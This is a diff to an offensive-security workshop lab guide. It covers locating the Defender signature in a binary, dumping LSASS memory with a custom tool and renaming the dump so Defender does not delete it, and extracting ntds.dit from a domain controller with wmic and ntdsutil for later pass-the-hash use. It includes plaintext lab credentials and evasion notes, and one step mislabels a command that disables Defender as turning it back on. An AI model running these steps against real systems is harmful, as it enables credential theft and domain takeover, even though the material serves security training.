@@ -6,8 +6,15 @@ If you are looking to understand what part of various malware or attacker tools 
 
 This tool will leverage the current database of defender and identify the area of a binary or file that is triggering a given alert.  This only works for static detections, not for heuristic or behavioral detections.
 
-1. On your attacker box, make sure defender is turned off.
-2. Open and administrative powershell prompt and navigate to `C:\Users\Public\Dekstop\LAB_FILES\assets`
+> **OPSEC NOTES**:
+> - This can be ran remotely
+> - You could have this feed out to a listenting IP/Port
+> - Can be ran as an injected dll in another service.
+> - the dump file itself is signatured by defender, much less the tools that generate it
+
+
+1. On the client box (LIGHTEATER), logged in directly as pslearner.
+2. Open and administrative powershell prompt and navigate to `C:\Users\Public\Desktop\LAB_FILES\assets`
 3. Unzip mimikatz and defender check using `expand-archive`
     ```powershell
     expand-archive defender-check.zip
@@ -21,8 +28,6 @@ This tool will leverage the current database of defender and identify the area o
 
 > If you still really wanted to use mimikatz, the process to re-compile a version that did not alert on defender (at least on file write) is to use the output of defender check to identify parts of the code that can be changed not to match the signature.
 
-**potentially use vscode to show how that would go**
-
 ## Custom LSASS Dump
 
 > Turning defender off, can either be difficult, or not guarunteed to stay that way due to domain policies, or even other EDR implementations. So what to do?
@@ -33,6 +38,7 @@ This tool will leverage the current database of defender and identify the area o
 Some examples of these techniques are what we will cover here and in the other adanced modules.
 
 1. From the Lighteater (Attacker Box), RDP into the TWORIVERS (client) with the local administrator account.  TWORIVERS\Administrator:Summerishere@2023!
+2. Ensure windows defender is turned back on. `Set-MpPreference -DisableRealtimeMonitoring 1`
 2. Open an Administrative powershell terminal.
 3. Change directory `cd c:\Users\Public\Desktop\LAB_FILES\assets`
 4. Unzip the custom-procdump folder.
@@ -51,9 +57,11 @@ This is detected and the proc.dump file is deleted.  Oh no!
 
 > Notice it is not deleting the .exe and the alert is actually focused on that processes dump the proc.dump file.  So likely the alert is focused on the file itselt.
 
-7. `.\nimprocdump.exe; rename-item c:\proc.dump c:\not.dump`
+7. This time, lets simply rename the lsass.dump file.  `.\nimprocdump.exe; rename-item c:\proc.dump c:\not.dump`
 
-**use nim custom .dll inject maybe, if I can make it work**
+> There are still alerts but the lsass.dump file is not deleted.
+
+
 
 ## Create Domain Save with 
 https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/
@@ -66,17 +74,17 @@ Notes: VSSADMIN gets caught because it's use is so commonly associated with the 
 
 1. Remote into the TWORIVERS (client ) 172.31.24.111 with the domain admin credentials: wheel\ralthor : JustAn0therG!ng3r
 2. As this user, open a administrative command prompt. (Leave defender on.)
-3. Run the following command to launch this remote process on the Domain Controller.
+3. Run the following command to launch this remote process on the Domain Controller using an administrative command prompt. Not powershell, the escape characters are different.
 
 ```batch
-wmic /node: /user: /password: process call create ntdsutil \"ac i ntds\" ifm \"create full c:\Windows\temp\pew\" qq"
+wmic /node:tarvalaon.wheel.co /user:wheel\Administrator /password:12qwaszx!@QWASZX process call create "cmd.exe /c mkdir C:\Windows\temp"
+wmic /node: /user:wheel\Administrator /password:12qwaszx!@QWASZX process call create "cmd.exe /c ntdsutil \"ac i ntds\" ifm \"create full c:\Windows\temp\pew\" q q"
 ```
-4. Retrieve the file from sysvol.
-5. Use the DINTERNALS package to pull the hashes.
-`get-addbaccount -all -dbPath c:\ntds.dit -bootkey $key`
-6. Recommend dropping these into a file, and they can be used later for pass the hash attacks.
-7.
 
+4. From you here you would retieve the file and unpack it to dump all the users and associated hashes without making really loud dcsync requests.
+
+5. You can use the impackt secrets dump to dump hashes out fo the ntds.dit file.
+[Secrets Dump Walk Through](https://airman604.medium.com/dumping-active-directory-password-hashes-deb9468d1633#:~:text=Using%20the%20two%20saved%20files%20%28NTDS.dit%20and%20SYSTEM,domain%20controller%29%3A%20secretsdump.py%20-system%20%3Cpath_to_system_hive%3E%20-ntds%20%3Cpath_to_ntds.dit%3E%20LOCAL)
 
 
 > From here you sould properly cover your tracks, but that is a different workshop.
